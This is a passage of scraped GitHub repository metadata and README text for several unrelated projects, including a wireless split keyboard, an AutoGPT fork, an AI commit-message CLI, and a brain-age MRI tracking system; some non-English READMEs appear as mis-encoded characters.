      "readme": "# Daedalus Keyboard\n\nDaedalus is a compact open-source, split, wireless ergonomic keyboard with trackpad and encoder.\n\n![Image](/assets/main-img.jpg)\n\n## Daedalus Keyboard\n\nIt's a 36 key low-profile, split, wireless, ergonomic keyboard that includes a trackpad and a rotary encoder powered with ZMK on 2 Nice!Nano microcontrollers running on 2 110mAh batteries. It features a key splay inspired from the TOTEM, and a key layout modelled after my hand and inspired by the Corne. It's meant to be portable, silent and unobstrusive thanks to the Ambient Twighlight silent switches and the wireless connectivity.\n\n## Mission\n\nThe Daedalus Keyboard has been a hobby project that I worked on during the last year. It has been my first real hardware project that I've done, and I learned a lot throughout the way. Therefore, I aim for this project to be the most open and educational keyboard project possible for everyone.\n\nTherefore, here you will find everything needed to get started or to satiate your curiosity: all of the code, the schematics, the CAD files and even my notes during research.\n\nIf you're interested in building your own keyboard, then the [report](/docs/report.pdf) might interest you. It is a compreheensive document that describes the whole process of creation of the keyboard step by step, whilst giving some useful tips throughout and some valuable lessons learned at the end.\n\n## Repository Navigation\n\nThe repository is split in the following directories:\n\n- **Chassis**: Everything related to the chassis and components that are not hardware - CAD files, drawings and files ready for 3D printing or laser cutting right away\n- **Hardware**: Related to the PCB and electronic components - KiCAD schematic and PCB, and even gerber files to submit to a PCB manufacturer\n- **Firmware**: The code necessary to run the keyboard - Keybinds, ZMK config, etc.\n- **Docs**: The documentation to help you get started building this keyboard or any other - Build log, BOM, research, etc.\n\n## Current development\n\nCurrently I'm working on adding to this repository the following, in order:\n\n- Porting the CATIA files into an open source file format\n- A standalone step by step build guide (& BOM)\n- A contributing/editing guide\n- Publishing the Drawings\n\n## Contributing\n\nYou're welcome to contribute to this project in any way shape or form that is constructive.\n\n## Licence\n\nThis project is licenced differently for each domain, with the intention of promoting open source hardware and software:\n\n- Firmware and code: [GNU Affero General Public License v3 (AGPLv3)](./LICENSE-FIRMWARE)\n- Hardware: [CERN Open Hardware License v2 - Strongly Reciprocal](./LICENSE-HARDWARE)\n- Documentation and Media: [Creative Commons Attribution-ShareAlike 4.0](https://creativecommons.org/licenses/by-sa/4.0/)\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:39:58.673974"
  },
  {
    "basic_info": {
      "name": "homed-wiki",
      "full_name": "u236/homed-wiki",
      "owner": "u236",
      "description": null,
      "url": "https://github.com/u236/homed-wiki",
      "clone_url": "https://github.com/u236/homed-wiki.git",
      "ssh_url": "git@github.com:u236/homed-wiki.git",
      "homepage": null,
      "created_at": "2025-09-17T15:45:06Z",
      "updated_at": "2025-09-18T10:25:02Z",
      "pushed_at": "2025-09-18T10:24:57Z"
    },
    "stats": {
      "stars": 25,
      "forks": 1,
      "watchers": 25,
      "open_issues": 0,
      "size": 16344
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 1122
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "![HOMEd Wiki](.github/logo.png)\n\n# HOMEd Wiki\n\n–§–∞–π–ª—ã –¥–ª—è —Å–∞–π—Ç–∞ –¥–æ–∫—É–º–µ–Ω—Ç–∞—Ü–∏–∏ HOMEd:\\\nhttps://wiki.homed.dev\n",
      "default_branch": "master"
    },
    "fetched_at": "2025-09-18T10:39:59.829282"
  },
  {
    "basic_info": {
      "name": "autozero-gpt",
      "full_name": "ai-joon/autozero-gpt",
      "owner": "ai-joon",
      "description": null,
      "url": "https://github.com/ai-joon/autozero-gpt",
      "clone_url": "https://github.com/ai-joon/autozero-gpt.git",
      "ssh_url": "git@github.com:ai-joon/autozero-gpt.git",
      "homepage": null,
      "created_at": "2025-09-17T09:34:54Z",
      "updated_at": "2025-09-18T07:45:25Z",
      "pushed_at": "2025-09-18T01:14:59Z"
    },
    "stats": {
      "stars": 20,
      "forks": 2,
      "watchers": 20,
      "open_issues": 0,
      "size": 107177
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 1546291,
        "TypeScript": 591591,
        "Dart": 203562,
        "HCL": 27393,
        "C++": 23419,
        "CMake": 18862,
        "MDX": 12901,
        "CSS": 9233,
        "Smarty": 7518,
        "Dockerfile": 6417,
        "JavaScript": 5968,
        "Shell": 4513,
        "HTML": 3413,
        "Ruby": 2803,
        "PLpgSQL": 2443,
        "Jinja": 2398,
        "Swift": 2384,
        "C": 1425,
        "Batchfile": 478,
        "Kotlin": 140,
        "Objective-C": 38
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# AutoGPT: Build, Deploy, and Run AI Agents\n\n**AutoGPT** is a powerful platform that allows you to create, deploy, and manage continuous AI agents that automate complex workflows. \n\n## Hosting Options \n   - Download to self-host\n   - [Join the Waitlist](https://bit.ly/3ZDijAI) for the cloud-hosted beta  \n\n## How to Setup for Self-Hosting\n> [!NOTE]\n> Setting up and hosting the AutoGPT Platform yourself is a technical process. \n> If you'd rather something that just works, we recommend [joining the waitlist](https://bit.ly/3ZDijAI) for the cloud-hosted beta.\n\nhttps://github.com/user-attachments/assets/d04273a5-b36a-4a37-818e-f631ce72d603\n\nThis tutorial assumes you have Docker, VSCode, git and npm installed.\n\n### üß± AutoGPT Frontend\n\nThe AutoGPT frontend is where users interact with our powerful AI automation platform. It offers multiple ways to engage with and leverage our AI agents. This is the interface where you'll bring your AI automation ideas to life:\n\n   **Agent Builder:** For those who want to customize, our intuitive, low-code interface allows you to design and configure your own AI agents. \n   \n   **Workflow Management:** Build, modify, and optimize your automation workflows with ease. You build your agent by connecting blocks, where each block     performs a single action.\n   \n   **Deployment Controls:** Manage the lifecycle of your agents, from testing to production.\n   \n   **Ready-to-Use Agents:** Don't want to build? Simply select from our library of pre-configured agents and put them to work immediately.\n   \n   **Agent Interaction:** Whether you've built your own or are using pre-configured agents, easily run and interact with them through our user-friendly      interface.\n\n   **Monitoring and Analytics:** Keep track of your agents' performance and gain insights to continually improve your automation processes.\n\n[Read this guide](https://docs.agpt.co/server/new_blocks/) to learn how to build your own custom blocks.\n\n### üíΩ AutoGPT Server\n\nThe AutoGPT Server is the powerhouse of our platform This is where your agents run. Once deployed, agents can be triggered by external sources and can operate continuously. It contains all the essential components that make AutoGPT run smoothly.\n\n   **Source Code:** The core logic that drives our agents and automation processes.\n   \n   **Infrastructure:** Robust systems that ensure reliable and scalable performance.\n   \n   **Marketplace:** A comprehensive marketplace where you can find and deploy a wide range of pre-built agents.\n\n### üêô Example Agents\n\nHere are two examples of what you can do with AutoGPT:\n\n1. **Generate Viral Videos from Trending Topics**\n   - This agent reads topics on Reddit.\n   - It identifies trending topics.\n   - It then automatically creates a short-form video based on the content. \n\n2. **Identify Top Quotes from Videos for Social Media**\n   - This agent subscribes to your YouTube channel.\n   - When you post a new video, it transcribes it.\n   - It uses AI to identify the most impactful quotes to generate a summary.\n   - Then, it writes a post to automatically publish to your social media. \n\nThese examples show just a glimpse of what you can achieve with AutoGPT! You can create customized workflows to build agents for any use case.\n\n---\n",
      "default_branch": "master"
    },
    "fetched_at": "2025-09-18T10:40:00.964458"
  },
  {
    "basic_info": {
      "name": "lazycommit",
      "full_name": "KartikLabhshetwar/lazycommit",
      "owner": "KartikLabhshetwar",
      "description": "A CLI that writes your git commit messages for you with AI using Groq. Never write a commit message again.",
      "url": "https://github.com/KartikLabhshetwar/lazycommit",
      "clone_url": "https://github.com/KartikLabhshetwar/lazycommit.git",
      "ssh_url": "git@github.com:KartikLabhshetwar/lazycommit.git",
      "homepage": "https://www.npmjs.com/package/lazycommitt",
      "created_at": "2025-09-17T13:31:09Z",
      "updated_at": "2025-09-18T10:19:34Z",
      "pushed_at": "2025-09-18T08:57:05Z"
    },
    "stats": {
      "stars": 20,
      "forks": 1,
      "watchers": 20,
      "open_issues": 1,
      "size": 713
    },
    "tech_info": {
      "language": "TypeScript",
      "languages": {
        "TypeScript": 68070,
        "HTML": 6323,
        "Ruby": 614
      },
      "license": "Apache License 2.0",
      "topics": [
        "ai",
        "cli",
        "git",
        "github",
        "groq",
        "groq-api",
        "npm",
        "npm-package",
        "openai"
      ]
    },
    "content": {
      "readme": "<div align=\"center\">\n  <div>\n    <h1 align=\"center\">lazycommit</h1>\n<img width=\"2816\" height=\"1536\" alt=\"lazycommit\" src=\"https://github.com/user-attachments/assets/ee0419ef-2461-4b45-8509-973f3bb0f55c\" />\n\n  </div>\n\t<p>A CLI that writes your git commit messages for you with AI using Groq. Never write a commit message again.</p>\n\t<a href=\"https://www.npmjs.com/package/lazycommitz\"><img src=\"https://img.shields.io/npm/v/lazycommitt\" alt=\"Current version\"></a>\n\t<a href=\"https://github.com/KartikLabhshetwar/lazycommit\"><img src=\"https://img.shields.io/github/stars/KartikLabhshetwar/lazycommit\" alt=\"GitHub stars\"></a>\n\t<a href=\"https://github.com/KartikLabhshetwar/lazycommit/blob/main/LICENSE\"><img src=\"https://img.shields.io/npm/l/lazycommitt\" alt=\"License\"></a>\n</div>\n\n---\n\n## Setup\n\n> The minimum supported version of Node.js is v18. Check your Node.js version with `node --version`.\n\n1. Install _lazycommit_:\n\n   ```sh\n   npm install -g lazycommitt\n   ```\n\n### Install via Homebrew (macOS)\n\n```sh\nbrew install lazycommit\n```\n\nUpgrade:\n\n```sh\nbrew upgrade lazycommit\n```\n\n2. Retrieve your API key from [Groq Console](https://console.groq.com/keys)\n\n   > Note: If you haven't already, you'll have to create an account and get your API key.\n\n3. Set the key so lazycommit can use it:\n\n   ```sh\n   lazycommit config set GROQ_API_KEY=<your token>\n   ```\n\n   This will create a `.lazycommit` file in your home directory.\n\n### Upgrading\n\nCheck the installed version with:\n\n```\nlazycommit --version\n```\n\nIf it's not the [latest version](https://github.com/KartikLabhshetwar/lazycommit/releases/latest), run:\n\n```sh\nnpm update -g lazycommitt\n```\n\n## Usage\n\n### CLI mode\n\nYou can call `lazycommit` directly to generate a commit message for your staged changes:\n\n```sh\ngit add <files...>\nlazycommit\n```\n\n`lazycommit` passes down unknown flags to `git commit`, so you can pass in [`commit` flags](https://git-scm.com/docs/git-commit).\n\nFor example, you can stage all changes in tracked files as you commit:\n\n```sh\nlazycommit --all # or -a\n```\n\n> üëâ **Tip:** Use the `lzc` alias if `lazycommit` is too long for you.\n\n#### Generate multiple recommendations\n\nSometimes the recommended commit message isn't the best so you want it to generate a few to pick from. You can generate multiple commit messages at once by passing in the `--generate <i>` flag, where 'i' is the number of generated messages:\n\n```sh\nlazycommit --generate <i> # or -g <i>\n```\n\n> Warning: this uses more tokens, meaning it costs more.\n\n#### Generating Conventional Commits\n\nIf you'd like to generate [Conventional Commits](https://conventionalcommits.org/), you can use the `--type` flag followed by `conventional`. This will prompt `lazycommit` to format the commit message according to the Conventional Commits specification:\n\n```sh\nlazycommit --type conventional # or -t conventional\n```\n\nThis feature can be useful if your project follows the Conventional Commits standard or if you're using tools that rely on this commit format.\n\n#### Exclude files from analysis\n\nYou can exclude specific files from AI analysis using the `--exclude` flag:\n\n```sh\nlazycommit --exclude package-lock.json --exclude dist/\n```\n\n#### Handling large diffs\n\nFor large commits with many files, lazycommit automatically stays within API limits:\n\n- **Automatic detection**: Large diffs are detected\n- **Per-file splitting**: Diffs are split by file first\n- **Safe chunking**: Each file diff is chunked conservatively (default: 4000 tokens)\n- **Combination**: Results are combined into one concise message\n\n### Git hook\n\nYou can also integrate _lazycommit_ with Git via the [`prepare-commit-msg`](https://git-scm.com/docs/githooks#_prepare_commit_msg) hook. This lets you use Git like you normally would, and edit the commit message before committing.\n\n#### Install\n\nIn the Git repository you want to install the hook in:\n\n```sh\nlazycommit hook install\n```\n\n#### Uninstall\n\nIn the Git repository you want to uninstall the hook from:\n\n```sh\nlazycommit hook uninstall\n```\n\n#### Usage\n\n1. Stage your files and commit:\n\n   ```sh\n   git add <files...>\n   git commit # Only generates a message when it's not passed in\n   ```\n\n   > If you ever want to write your own message instead of generating one, you can simply pass one in: `git commit -m \"My message\"`\n\n2. Lazycommit will generate the commit message for you and pass it back to Git. Git will open it with the [configured editor](https://docs.github.com/en/get-started/getting-started-with-git/associating-text-editors-with-git) for you to review/edit it.\n\n3. Save and close the editor to commit!\n\n## Configuration\n\n### Reading a configuration value\n\nTo retrieve a configuration option, use the command:\n\n```sh\nlazycommit config get <key>\n```\n\nFor example, to retrieve the API key, you can use:\n\n```sh\nlazycommit config get GROQ_API_KEY\n```\n\nYou can also retrieve multiple configuration options at once by separating them with spaces:\n\n```sh\nlazycommit config get GROQ_API_KEY generate\n```\n\n### Setting a co",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:40:02.086450"
  },
  {
    "basic_info": {
      "name": "maisti_teste",
      "full_name": "Benevdx/maisti_teste",
      "owner": "Benevdx",
      "description": "repositorio teste para aulas do mais ti - ufs",
      "url": "https://github.com/Benevdx/maisti_teste",
      "clone_url": "https://github.com/Benevdx/maisti_teste.git",
      "ssh_url": "git@github.com:Benevdx/maisti_teste.git",
      "homepage": null,
      "created_at": "2025-09-17T13:25:43Z",
      "updated_at": "2025-09-17T14:41:49Z",
      "pushed_at": "2025-09-17T14:28:44Z"
    },
    "stats": {
      "stars": 18,
      "forks": 0,
      "watchers": 18,
      "open_issues": 0,
      "size": 13
    },
    "tech_info": {
      "language": "JavaScript",
      "languages": {
        "JavaScript": 4780
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# maisti_teste\nrepositorio teste para aulas do mais ti - ufs\n\n\n# Adi√ß√£o de um teste\n## Head 2\n### Head 3\n",
      "default_branch": "main"
    },
    "fetched_at": "2025-09-18T10:40:03.214119"
  },
  {
    "basic_info": {
      "name": "Trajectory",
      "full_name": "ShyShyFaceElephant/Trajectory",
      "owner": "ShyShyFaceElephant",
      "description": "Âü∫ÊñºËÖ¶Âπ¥ÈΩ°ËàáÂ§±Êô∫ÁóáÈ†êÊ∏¨Ê®°Âûã‰πãÈï∑ÊúüËÖ¶ÈÉ®ÂÅ•Â∫∑ËøΩËπ§Á≥ªÁµ±",
      "url": "https://github.com/ShyShyFaceElephant/Trajectory",
      "clone_url": "https://github.com/ShyShyFaceElephant/Trajectory.git",
      "ssh_url": "git@github.com:ShyShyFaceElephant/Trajectory.git",
      "homepage": null,
      "created_at": "2025-09-17T04:21:57Z",
      "updated_at": "2025-09-18T07:02:35Z",
      "pushed_at": "2025-09-17T06:56:59Z"
    },
    "stats": {
      "stars": 17,
      "forks": 2,
      "watchers": 17,
      "open_issues": 0,
      "size": 547654
    },
    "tech_info": {
      "language": "Jupyter Notebook",
      "languages": {
        "Jupyter Notebook": 2212291,
        "Dart": 118262,
        "Python": 62925,
        "C++": 24945,
        "CMake": 19803,
        "HTML": 14229,
        "Swift": 2069,
        "C": 1425,
        "Kotlin": 128,
        "Objective-C": 38
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# üß† Trajectory Âü∫ÊñºËÖ¶Âπ¥ÈΩ°ËàáÂ§±Êô∫ÁóáÈ†êÊ∏¨Ê®°Âûã‰πãÈï∑ÊúüËÖ¶ÈÉ®ÂÅ•Â∫∑ËøΩËπ§Á≥ªÁµ±\n\n## üëÄÁ≥ªÁµ±Á∞°‰ªã\n\n[![Áî¢ÂìÅ‰ªãÁ¥πÂΩ±ÁâáÔºö](images/demo.png)](https://youtu.be/9u6xG_67Q1s)\n\n> Áî¢ÂìÅ‰ªãÁ¥πÂΩ±ÁâáÔºöhttps://youtu.be/9u6xG_67Q1s\n\nTrajectoryÊòØ‰∏ÄÂ•óÂü∫Êñº**ËÖ¶Âπ¥ÈΩ°ËàáÂ§±Êô∫ÁóáÈ†êÊ∏¨Ê®°Âûã**ÁöÑÈï∑ÊúüËÖ¶ÈÉ®ÂÅ•Â∫∑ËøΩËπ§Á≥ªÁµ±ÔºåÊó®Âú®ÊªøË∂≥È´òÈΩ°ÂåñËàáÂ∞ëÂ≠êÂåñÁ§æÊúÉÂ∞çÁ≤æÊ∫ñÈÜ´ÁôÇÁöÑÈúÄÊ±Ç„ÄÇÂèóË©¶ËÄÖ‰πã**ËÖ¶ÈÉ® MRI**ÂΩ±ÂÉèËº∏ÂÖ•Ëá≥Êú¨Á≥ªÁµ±ÂæåÔºåËÖ¶ÈΩ°È†êÊ∏¨Ê®°ÂûãÊúÉÊèê‰æõËÖ¶ÈΩ°ÂÄº‰ΩúÁÇ∫ËÖ¶ÈÉ®ÂÅ•Â∫∑ÁãÄÊÖãÁöÑÈáèÂåñÊåáÊ®ô„ÄÇÊú¨Á≥ªÁµ±ÈÅ©Áî®ÊñºÊâÄÊúâÂπ¥ÈΩ°Â±§Ôºå‰∏çÂÉÖÂèØ‰ΩúÁÇ∫ÂÖíÁ´•ËàáÈùíÂ∞ëÂπ¥ËÖ¶ÈÉ®ÊàêÁÜüÂ∫¶ÁöÑË©ï‰º∞Â∑•ÂÖ∑Ôºå‰∫¶ËÉΩ‰ΩúÁÇ∫‰∏≠ËÄÅÂπ¥ÊóèÁæ§Ë™çÁü•ÈÄÄÂåñÁöÑÊó©ÊúüÂæµÂÖÜ„ÄÇ\n\nÊàëÂÄëÂ∞áÊú¨Á≥ªÁµ±ÂëΩÂêçÁÇ∫„ÄåTrajectory„ÄçÔºåÊÑèÁÇ∫„ÄåËªåË∑°„Äç„ÄÇÂÆÉ‰∏çÂÉÖÊòØÂñÆÁ¥îÁöÑËÖ¶ÈΩ°È†êÊ∏¨Ê®°Âûã‰πãÂúñÂΩ¢Âåñ‰ªãÈù¢ÔºåÊõ¥ÊòØ‰∏ÄÂÄãÂåÖÂê´**Èï∑ÊúüËÖ¶ÈΩ°ËøΩËπ§**„ÄÅ**AIÂ§±Êô∫ÁóáËºîÂä©Ë®∫Êñ∑**Ëàá**ÈóúÈçµËÖ¶ÂçÄÁÜ±Âúñ**ÁöÑÂÆåÊï¥Á≥ªÁµ±„ÄÇÊú¨Á≥ªÁµ±ÈÄèÈÅéÊäòÁ∑öÂúñÂëàÁèæÊ≠∑Ê¨°ËÖ¶ÈΩ°Á¥ÄÈåÑÔºåËøΩËπ§ÂÄã‰∫∫ÊàêÈï∑ËªåË∑°„ÄÇ‰∏ÄËà¨‰ΩøÁî®ËÄÖÂèØË™øÈñ±Ê≠∑Ê¨° MRI ÂΩ±ÂÉèÁ¥ÄÈåÑÔºå‰∏¶Êü•ÁúãÂÖ∂ÂàÜÊûêÁµêÊûúÔºàÂåÖÊã¨ËÖ¶ÈΩ°„ÄÅAI Â§±Êô∫ÁóáË®∫Êñ∑ËàáÈóúÈçµËÖ¶ÂçÄÁÜ±ÂúñÔºâÔºõÈÜ´Â∏´ÂâáÂÖ∑Êúâ‰∏äÂÇ≥„ÄÅÁ∑®ËºØËàáÊü•ÁúãÊÇ£ËÄÖË≥áÊñôÁ≠âÊõ¥È´òÂ±§Ê¨°ÁöÑÁÆ°ÁêÜËÄÖÊ¨äÈôê„ÄÇ\n\n---\n\n## üè•ÊáâÁî®Â†¥ÊôØ\n\n![Á≥ªÁµ±ÊáâÁî®Â†¥ÊôØ](images/SystemApplicationScenarios.png)\n> Âúñ1. TrajectoryÁ≥ªÁµ±ÊáâÁî®Â†¥ÊôØ\n\nÊú¨Á≥ªÁµ±‰ΩøÁî®ÊµÅÁ®ãÂ¶Ç‰∏ãÔºö\n\n1. ÂèóË©¶ËÄÖÈÄ≤Ë°åÁ∞°ÊòìÊô∫ËÉΩÁãÄÊÖãÊ∏¨È©óÔºàMMSEÔºâÔºà‰∏≠‰ΩéÂπ¥ÈΩ°Áæ§È´î‰∏çÈúÄÂèÉËàáÔºâ\n2. ÂèóË©¶ËÄÖÊãçÊîùËÖ¶ÈÉ®MRIÂΩ±ÂÉè\n3. Ë≥áË®äÂÆ§‰∫∫Âì°Â∞áËÖ¶ÈÉ®MRIÂΩ±ÂÉèÂèäË™çÁü•Ê∏¨È©óÁµêÊûú‰∏äÂÇ≥Ëá≥‰º∫ÊúçÂô®\n4. ‰º∫ÊúçÂô®ÈÅãË°åËÖ¶ÈΩ°È†êÊ∏¨Ê®°ÂûãËàáÂ§±Êô∫ÁóáË®∫Êñ∑Ê®°Âûã\n5. ‰º∫ÊúçÂô®Â∞áÂàÜÊûêÁµêÊûúÔºàÂåÖÂê´ÔºöËÖ¶ÈΩ°„ÄÅAIÂ§±Êô∫ÁóáË®∫Êñ∑„ÄÅÈóúÈçµËÖ¶ÂçÄÁÜ±ÂúñÔºâÊ≠∏Ê™î\n6. ÈÜ´Â∏´Ë™øÁî®ÂèóË©¶ËÄÖË≥áÊñô‰∏¶ÁµêÂêàËá™Ë∫´Â∞àÊ•≠Áü•Ë≠òÂÅöÂá∫ÊúÄÁµÇË®∫Êñ∑\n7. ÂèóË©¶ËÄÖÂú®Èô¢ÂÖßÊ©üÂè∞‰πüÂèØË™øÈñ±ÂàÜÊûêÁµêÊûúËàáË®∫Êñ∑Á¥ÄÈåÑ\n\n---\n\n## ‚õìÔ∏èÁ≥ªÁµ±Êû∂Êßã\n\n![Á≥ªÁµ±Êû∂Êßã](images/SystemFramework.png)\n> Âúñ2. TrajectoryÁ≥ªÁµ±Êû∂Êßã\n\nÊú¨Á≥ªÁµ±Êé°**ÂâçÂæåÁ´ØÂÆåÂÖ®ÂàÜÈõ¢**Ë®≠Ë®àÔºåÁõÆÁöÑÊòØËÆì‰ΩøÁî®ËÄÖÂú®‰∏çÂêåÁµÇÁ´ØË®≠ÂÇôÁöÜËÉΩ‰ΩøÁî®Áõ∏ÂêåAPIÂ≠òÂèñË≥áÊñô„ÄÇ\n\nÊú¨Á≥ªÁµ±Ê¨≤Âú®ÈÜ´Èô¢‰∏≠Â§öÁ®ÆÁµÇÁ´ØË®≠ÂÇôÈÉ®Â±¨ÔºåÂõ†Ê≠§Êé°Áî®Ë∑®Âπ≥Âè∞ÂâçÁ´ØÊ°ÜÊû∂ÔºåËÄÉÈáèÂà∞ MRI ÂΩ±ÂÉèÊ∂âÂèäÂ§ßÈáèÊï∏ÊìöÂÇ≥Ëº∏ËàáÈ°ØÁ§∫ÔºåÊïÖÂú®ÊàëÂÄëÂ§öÁ®ÆË∑®Âπ≥Âè∞ÂâçÁ´ØÊ°ÜÊû∂‰∏≠ÔºåÈÅ∏ÊìáÂ≠òÂèñÈÄüÂ∫¶ËàáÂÅµÁéáË°®ÁèæÊõ¥ÂçìË∂äÁöÑFlutter„ÄÇÂâçÁ´ØÂàÜÁÇ∫ÈÜ´Â∏´‰ªãÈù¢Ëàá‰∏ÄËà¨‰ΩøÁî®ËÄÖ‰ªãÈù¢Ôºå‰∏ÄËà¨‰ΩøÁî®ËÄÖ‰ªãÈù¢Êèê‰æõ‰ΩøÁî®ËÄÖÊü•Èñ±Ê≠∑Ê¨°ÂΩ±ÂÉèÁ¥ÄÈåÑËàáËÖ¶ÈÉ®ÂàÜÊûêÁµêÊûúÔºõÈÜ´Â∏´‰ªãÈù¢ÂâáÊèê‰æõÁÆ°ÁêÜËÄÖ‰∏äÂÇ≥ÂΩ±ÂÉè„ÄÅÂü∑Ë°åAIÈÅãÁÆóÂäüËÉΩÔºå‰∏¶Áµ±‰∏ÄÁÆ°ÁêÜÂèóË©¶ËÄÖ„ÄÇ\n\nÁî±ÊñºÊú¨Á≥ªÁµ±ÁöÑ AI Ê®°Âûã‰ª• Python Êí∞ÂØ´ÔºåÁÇ∫ÊèêÂçáÈÅãÁÆóÊïàÁéá‰∏¶Á∞°ÂåñË∑®Ë™ûË®Ä‰ªãÈù¢Á∂≠Ë≠∑ÔºåÊàëÂÄëÈÅ∏Êìá‰ª•ÂêåÊ®£Âü∫Êñº Python ÁöÑ FastAPI ‰ΩúÁÇ∫ÂæåÁ´ØÊ°ÜÊû∂„ÄÇÂæåÁ´ØÁî±‰º∫ÊúçÂô®Ë≤†Ë≤¨Êé•ÂèóAPIË´ãÊ±ÇÔºå‰∏¶Ê∫ùÈÄöË≥áÊñôÂ∫´ÂèäAIÊ®°ÂûãÊ®°ÁµÑÔºåÂΩºÊ≠§Áç®Á´ãÈÅãË°åÔºåÁ¢∫‰øùÁ≥ªÁµ±ÂÆâÂÖ®Á©©ÂÆö„ÄÇ\n\nÈ†ÜÂ∏∂‰∏ÄÊèêÔºåÊú¨Á≥ªÁµ±Èô§‰∫ÜÊèê‰æõ‰ΩøÁî®ËÄÖÊü•ÁúãË®∫Êñ∑ÁµêÊûúÂ§ñÔºåÂ∏åÊúõËÉΩÁ¥çÂÖ•„ÄåÂÅ•Â∫∑ÊåáÂçó„ÄçÁµ¶‰∫àÂÖ∑È´îÁöÑÊ≤ªÁôÇÊàñ‰øùÂÅ•ÊñπÈáùÔºå‰ΩÜÊú¨ÂúòÈöäÂèóÈôêÊñºÂ∞àÊ•≠Áü•Ë≠òÔºåÊ≠§ÂäüËÉΩÊö´ÊôÇÁïôÂú®ËóçÂúñ‰∏≠„ÄÇ\n\n---\n\n## ü§ñAIÈÅãÁÆóÊ®°ÁµÑ\n\n![AIÈÅãÁÆóÊ®°ÁµÑ](images/AiModule.png)\n> Âúñ3. Trajectory AIÈÅãÁÆóÊ®°ÁµÑ\n\nÂúñ3ÁÇ∫Êú¨Á≥ªÁµ±ÂæåÁ´ØÁöÑAIÈÅãÁÆóÊ®°ÁµÑ‰πãÊû∂Êßã„ÄÇÈ¶ñÂÖàÔºåËÖ¶ÈÉ® MRI ÂΩ±ÂÉèÊúÉÁ∂ìÈÅéÂâçËôïÁêÜÔºåËôïÁêÜÂæåÁöÑÂΩ±ÂÉèÈö®ÂæåÊúÉË¢´ÈÄÅÂÖ•ÂÖ©ÂÄãÂπ≥Ë°åÁöÑÈÅãÁÆóÊµÅÁ®ãÔºö\n\n1. ËÖ¶ÈΩ°È†êÊ∏¨ÔºöÂΩ±ÂÉèË¢´Ëº∏ÂÖ•Ëá≥ SFCN Ê®°Âûã‰∏¶Ëº∏Âá∫ËÖ¶ÈΩ°È†êÊ∏¨ÂÄº„ÄÇ\n2. Â§±Êô∫ÁóáÂàÜÈ°ûÔºöÂΩ±ÂÉèËàáÂÖ∂‰ªñËºîÂä©ÁâπÂæµÔºàË™çÁü•Ê∏¨È©óÂàÜÊï∏„ÄÅÊÄßÂà•ËàáÂπ¥ÈΩ°Ôºâ‰∏ÄËµ∑Ëº∏ÂÖ•Ëá≥ DenseNet „ÄÅ XGBoost Ê∑∑ÂêàÊ®°ÂûãÔºåËº∏Âá∫Â§±Êô∫ÁóáÂàÜÈ°ûÁµêÊûú„ÄÇÊ≠§Â§±Êô∫ÁóáÂàÜÈ°ûÊ®°ÂûãÁî±Êú¨ÂØ¶È©óÂÆ§ÁöÑÂâçËº©ÊâÄÁ†îÁôº„ÄÇ\n\nÊúÄÂæåÔºåÂà©Áî®**Grad-CAM ÊºîÁÆóÊ≥ï**ÔºåÊ†πÊìöÊ®°ÂûãËº∏Âá∫ÁîüÊàêÂ∞çÊáâÁöÑ**ÈóúÈçµËÖ¶ÂçÄÁÜ±Âúñ**„ÄÇ\n\n---\n\n## üßë‚ÄçüíªTrajectoryÂäüËÉΩ‰ªãÁ¥π\n\n![ÁôªÂÖ•‰ªãÈù¢](images/login.png)\n> Âúñ4. ÁôªÂÖ•‰ªãÈù¢\n\nÂúñ4È†ÅÈù¢Êèê‰æõÂÖ©Á®ÆÁôªÂÖ•ÊñπÂºèÔºöÂèóË©¶ËÄÖÁî± „Äå‰∏ÄËà¨ÁôªÂÖ•„ÄçÈÄöÈÅìÁôªÂÖ•ÔºåËÄåÁÆ°ÁêÜËÄÖÂâáÁî± „ÄåÈÜ´Â∏´ÁôªÂÖ•„ÄçÈÄöÈÅìÁôªÂÖ•„ÄÇ\n\n![ÈÜ´Â∏´‰ªãÈù¢‚ÄîÊàêÂì°ÁÆ°ÁêÜ](images/memberManagement.png)\n> Âúñ5. ÈÜ´Â∏´‰ªãÈù¢‚ÄîÊàêÂì°ÁÆ°ÁêÜ\n\nÂúñ5È†ÅÈù¢Êèê‰æõÁÆ°ÁêÜËÄÖ‰∏ÄÂÄãÂàóË°®ÔºåËÉΩÊü•ÁúãÊâÄ‰ª•ÊúâÂèóË©¶ËÄÖÔºåÈªûÈÅ∏„ÄåÈÅ∏Êìá„ÄçÊåâÈàïË∑≥ËΩâËá≥Ë©≤ÂèóË©¶ËÄÖ‰ªãÈù¢ÔºåË™øÈñ±ÂÖ∂ËÖ¶ÈÉ®ÂàÜÊûêÁµêÊûúÂèäÊ≠∑Ê¨°ÂΩ±ÂÉèË®òÈåÑ„ÄÇ\n\n![ÈÜ´Â∏´‰ªãÈù¢‚Äî‰∏äÂÇ≥ÂΩ±ÂÉè](images/uploadImage.png)\n> Âúñ6. ÈÜ´Â∏´‰ªãÈù¢‚Äî‰∏äÂÇ≥ÂΩ±ÂÉè\n\nÂúñ6È†ÅÈù¢Êèê‰æõË≥áË®äÂÆ§‰∫∫Âì°ÂúñÂΩ¢Âåñ‰ªãÈù¢‰∏äÂÇ≥Ê™¢Ê∏¨Ë≥áÊñôÔºå‰∏äÂÇ≥ÈÅéÁ®ãÂàÜÁÇ∫‰∏âÊ≠•È©üÔºö\n\n1. 